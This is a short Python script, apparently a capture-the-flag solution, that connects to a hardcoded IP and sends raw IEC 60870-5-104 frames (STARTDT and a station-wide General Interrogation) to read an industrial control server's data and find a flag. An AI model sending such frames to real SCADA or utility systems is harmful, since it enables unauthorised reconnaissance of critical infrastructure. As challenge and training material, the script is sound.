#!/usr/bin/env python3
import socket
import time

HOST = '169.58.126.107'
PORT = 6004

def main():
    s = socket.socket()
    s.settimeout(30)
    try:
        print('[*] Connecting...')
        s.connect((HOST, PORT))
        print('[+] Connected')
        
        # STARTDT ACT
        print('[*] Sending STARTDT ACT')
        s.send(bytes([0x68, 0x04, 0x07, 0x00, 0x00, 0x00]))
        time.sleep(2)
        r = s.recv(1024)
        print('[+] STARTDT:', r.hex() if r else 'none')
        
        # General Interrogation: Type 100, COT 6 (activation), CA 1
        # ASDU: TypeId(1)=100, VSQ(1)=1 (1 object), COT(1)=6, CA(2 LE), IOA(3 LE)=0, QOI(1)=20
        asdu = bytes([100, 0x01, 0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x14]) # QOI=20 (station interrogation)
        apci = bytes([0x68, len(asdu) + 4, 0x00, 0x00, 0x00, 0x00]) # I-frame
        print('[*] Sending GI')
        s.send(apci + asdu)
        time.sleep(5)
        
        # Read all responses
        all_data = b''
        while True:
            try:
                s.settimeout(5)
                r = s.recv(4096)
                if not r:
                    break
                all_data += r
                print('[+] Recv:', r.hex())
            except socket.timeout:
                break
            except:
                break
        
        print('[*] Total:', all_data.hex())
        if b'CTF{' in all_data:
            print('[!!!] FLAG:', all_data)
    finally:
        s.close()

if __name__ == '__main__':
    main()
